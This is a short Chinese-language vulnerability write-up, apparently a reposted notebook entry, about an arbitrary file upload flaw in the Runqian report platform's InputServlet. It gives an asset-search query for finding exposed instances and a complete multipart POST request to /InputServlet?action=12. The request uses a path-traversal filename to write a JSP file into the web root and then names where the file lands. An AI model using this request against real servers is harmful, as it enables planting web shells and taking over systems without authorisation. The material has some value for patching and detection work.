# 润乾报表InputServlet存在任意文件上传漏洞

# 一、漏洞简介
润乾报表是一个纯JAVA的企业级报表工具支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，提供高效的报表设计方案、强大的报表展现能力、灵活的部署机制，支持强关联语义模型，并且具备强有力的填报功能和olap分析，为企业级数据分析与商业智能提供了高性能、高效率的报表系统解决方案。润乾报表InputServlet存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 润乾报表

# 三、资产测绘
+ hunter`app.name="润乾报表平台"`
+ 特征

![1712713418597-1304fe4b-6423-40c5-b6c4-622581d06799.png](./img/nF5vX5OkCsHgPsZX/1712713418597-1304fe4b-6423-40c5-b6c4-622581d06799-019490.png)

# 四、漏洞复现
```java
POST /InputServlet?action=12 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 241
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="upsize"

1024
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\2211.jsp"
Content-Type: image/jpeg

123
--00content0boundary00--
```

![1712713445103-ad84172d-20aa-42b8-83ce-f74c1e305e7c.png](./img/nF5vX5OkCsHgPsZX/1712713445103-ad84172d-20aa-42b8-83ce-f74c1e305e7c-519159.png)

文件上传位置

```java
/2211.jsp
```

![1712713472577-df0cff32-9c0d-4008-ac1a-d3b6be3fbe2d.png](./img/nF5vX5OkCsHgPsZX/1712713472577-df0cff32-9c0d-4008-ac1a-d3b6be3fbe2d-185970.png)



> 更新: 2024-04-16 14:37:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ekg0bvs3ogtplydg>